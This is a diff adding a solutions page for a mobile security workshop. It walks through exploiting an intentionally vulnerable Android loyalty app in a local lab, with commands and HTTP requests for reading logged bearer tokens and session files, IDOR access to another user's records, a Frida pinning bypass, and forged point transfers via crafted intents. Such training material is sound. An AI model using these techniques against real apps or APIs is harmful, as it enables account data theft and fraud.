@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Mockapp · Workshop Solutions</title>
+<style>
+:root{font-family:system-ui,-apple-system,Segoe UI,sans-serif;color:#183b2c;background:#f4f5ef}
+*{box-sizing:border-box}body{margin:0}main{max-width:980px;margin:auto;padding:40px 20px 64px}
+h1{font-size:32px;margin:0 0 8px}h2{font-size:20px;margin:0 0 14px}p{line-height:1.5}
+.sub{color:#637a6a}.card{background:white;border:1px solid #dbe5d9;border-radius:16px;padding:22px;margin:18px 0}
+pre{background:#183b2c;color:#f4f5ef;padding:16px;border-radius:10px;overflow-x:auto;line-height:1.45}
+code{font-family:ui-monospace,SFMono-Regular,Consolas,monospace;font-size:13px}
+a{color:#245e43}.warn{background:#fff8e8;border:1px solid #ead6a0;border-radius:10px;padding:12px 14px}
+small{color:#637a6a}.sample{color:#456958;font-size:13px;font-weight:700;margin-bottom:3px}
+</style>
+</head>
+<body><main><nav style="display:flex;flex-wrap:wrap;gap:12px;background:white;border:1px solid #dbe5d9;border-radius:12px;padding:12px 18px;margin-bottom:22px"><a href="/">Exercises</a><a href="/setup">Setup</a><a href="/downloads">Downloads</a><a href="/solutions">Solutions</a><a href="/#settings">Lab Settings</a></nav>
+<h1>☕ Mockapp · Workshop Solutions</h1>
+<p class="sub">Solutions for all seven Home Lab exercises. Try the progressive hints first, then review the full walkthroughs at your own pace.</p>
+<p class="warn"><strong>For the isolated Docker Home Lab only.</strong> Replace <code>&lt;YOUR_BEARER_TOKEN&gt;</code> with your current token from Mockapp. The example commands do not use a real, reusable session token.</p>
+
+<section class="card">
+<h2>EXERCISE 1 — Static Android analysis</h2>
+<p>Open <code>AndroidManifest.xml</code> in JADX-GUI. Observe the exported launcher activity:</p>
+<pre><code>&lt;activity
+    android:name="com.mockapp.loyalty.DashboardActivity"
+    android:exported="true"&gt;
+    &lt;intent-filter&gt;
+        &lt;action android:name="android.intent.action.MAIN"/&gt;
+        &lt;category android:name="android.intent.category.LAUNCHER"/&gt;
+    &lt;/intent-filter&gt;
+&lt;/activity&gt;</code></pre>
+<p><small><code>exported="true"</code> allows an external app to launch this activity. Exported launchers are normal; the vulnerability appears when the activity trusts caller-controlled extras without authorization or confirmation.</small></p>
+</section>
+
+<section class="card">
+<h2>EXERCISE 2 — Local data and logs</h2>
+<p>Start monitoring the authentication log tag in your terminal before signing in:</p>
+<pre><code>adb shell logcat -s MockappAuth:D '*:S'</code></pre>
+<p>Now sign in as Alice (or sign out and sign in again). The authentication log entry will appear:</p>
+<p>Log in successfully. Look for the <code>MockappAuth</code> message, similar to:</p>
+<pre><code>D MockappAuth: Authentication succeeded, bearer token=&lt;YOUR_BEARER_TOKEN&gt;</code></pre>
+<p>The other exposure is a plaintext session preference. On the workshop's debuggable APK, run:</p>
+<pre><code>adb shell run-as com.mockapp.loyalty cat /data/data/com.mockapp.loyalty/shared_prefs/mockapp_session.xml</code></pre>
+<p>To find the relevant source in JADX-GUI: inspect <code>LoginActivity</code> and locate the <code>Log.d</code> call for <code>MockappAuth</code>, then inspect <code>SessionStore</code> for the SharedPreferences write.</p><p><small>Logcat and SharedPreferences both expose the same kind of sensitive credential. <code>run-as</code> works here because this APK is debuggable; it does not generally grant access to a non-debuggable production app.</small></p>
+</section>
+
+<section class="card">
+<h2>EXERCISE 3 — Hidden diagnostics</h2>
+<p>Launch the exported activity using ADB:</p>
+<pre><code>adb shell am start -n com.mockapp.loyalty/.DiagnosticsActivity</code></pre>
+<p><small>Check what is displayed and whether an external caller can open it. The presence of diagnostics alone is not necessarily a vulnerability; the exposure of sensitive session data is.</small></p>
+</section>
+
+<section class="card">
+<h2>EXERCISE 5 — Authorization (BOLA / IDOR)</h2>
+<p>In <strong>Burp → Proxy → HTTP history</strong>, right-click your authenticated <code>GET /api/v1/me</code> request and choose <strong>Send to Repeater</strong> (Ctrl+R). In Repeater, change the request path and send these requests with <strong>your own valid Bearer token</strong> and check whether another user's records are returned.</p>
+<p class="sample">1 — Read Bob's user profile (ID 1043)</p>
+<pre><code>GET /api/v1/users/1043 HTTP/1.1
+Accept: application/json
+Authorization: Bearer &lt;YOUR_BEARER_TOKEN&gt;
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; Android SDK built for x86_64 Build/UE1A.230829.036.A1)
+Host: 10.0.2.2:8000
+Connection: keep-alive
+Accept-Encoding: gzip, deflate, br</code></pre>
+<p class="sample">2 — Read Bob's transaction history</p>
+<pre><code>GET /api/v1/users/1043/transactions HTTP/1.1
+Accept: application/json
+Authorization: Bearer &lt;YOUR_BEARER_TOKEN&gt;
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; Android SDK built for x86_64 Build/UE1A.230829.036.A1)
+Host: 10.0.2.2:8000
+Connection: keep-alive
+Accept-Encoding: gzip, deflate, br</code></pre>
+<p><small>Expected vulnerability: the server checks for a logged-in user but fails to verify ownership of the requested account or transaction history.</small></p>
+</section>
+
+<section class="card"><h2>EXERCISE 4 — HTTP, HTTPS, and certificate pinning</h2><p>In Burp, import the supplied project settings JSON, verify the listener runs on <code>127.0.0.1:8088</code> with destination redirection to <code>127.0.0.1</code>, then browse to the provided custom <code>.p12</code> under the listener Certificate settings.</p><p>Push <code>lab-ca.crt</code> into Android and install it as a user CA. Configure the Android <strong>Wi-Fi network proxy</strong> to <code>10.0.2.2:8088</code> (not the emulator Extended Controls upstream proxy).</p><p>In Mockapp's <strong>⚗ Lab Testing</strong> menu, test HTTP, HTTPS and HTTPS + Pinning in order. Force-stop and restart after each change. HTTP/HTTPS should be interceptable, while the pinned mode should fail until Frida changes the custom pin-verification decision.</p><pre><code>adb shell am force-stop com.mockapp.loyalty
+frida -U -l ./bypass-mockapp-pinning.js -f com.mockapp.loyalty</code></pre><p>In JADX-GUI inspect <code>WorkshopPinVerifier.isPinned</code> and the calling code in <code>ApiClient</code>. The Frida hook changes the pin decision without disabling TLS hostname checks or CA validation. See <a href="/setup">Setup</a> for installing Frida Server.</p></section>
+<section class="card"><h2>EXERCISE 6 — Weak point transfer validation</h2><p>Log in as Alice, transfer a small positive number of points to Bob, then find the <code>POST /api/v1/transfers</code> request in Burp's HTTP history. Right-click → <strong>Send to Repeater</strong>.</p><p>Change the JSON to an amount greater than Alice's available balance, retaining her Bearer token:</p><pre><code>{"to_user":"bob","points":10000}</code></pre><p>Send the request. The server wrongly accepts the transfer and can make Alice's balance negative while crediting Bob. In the backend source, inspect the transfer endpoint to confirm that it checks positive quantity and destination but omits a sufficient-funds check.</p><p><small>Reset the Docker Home Lab if you want to restore starting balances.</small></p></section>
+<section class="card">
+<h2>FINAL CHALLENGE — CUPCAKE</h2>
+<p>The transfer endpoint does not verify that the sender has enough points. With a valid sender's Bearer token, transfer points to another workshop account:</p>
+<pre><code>POST /api/v1/transfers HTTP/1.1
+Accept: application/json
+Authorization: Bearer &lt;YOUR_BEARER_TOKEN&gt;
+Content-Type: application/json
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; Android SDK built for x86_64 Build/UE1A.230829.036.A1)
+Host: 10.0.2.2:8000
+Connection: keep-alive
+Accept-Encoding: gzip, deflate, br
+
+{"to_user":"your_user","points":123}</code></pre>
+<p><small>Replace <code>your_user</code> with a real <strong>different</strong> registered workshop username. Try a larger positive points value to see the missing balance check. Burp will calculate <code>Content-Length</code>; do not hard-code an incorrect value.</small></p>
+<p>A separate app could trigger the same vulnerable flow by launching the exported Dashboard activity with crafted Intent extras. Simulate that with ADB while logged in to Mockapp:</p>
+<pre><code>adb shell am start -n com.mockapp.loyalty/.DashboardActivity --es transfer_to_user your_user --ei transfer_points 10000 --ez auto_send true</code></pre>
+<p><small>Why it works: the app trusts the caller-controlled <code>auto_send</code> and transfer extras, bypassing the normal confirmation step. The API separately permits transfers that make the sender's balance negative. Log in as Bob after the 10,000-point transfer; his balance is enough to redeem the 9,999-point virtual cupcake.</small></p>
+</section>
+
+<p class="warn">All activities are intentionally vulnerable and should only be tested in your local Mockapp Home Lab.</p>
+<p><a href="/">← Back to Mockapp Lab</a></p>
+</main></body></html>
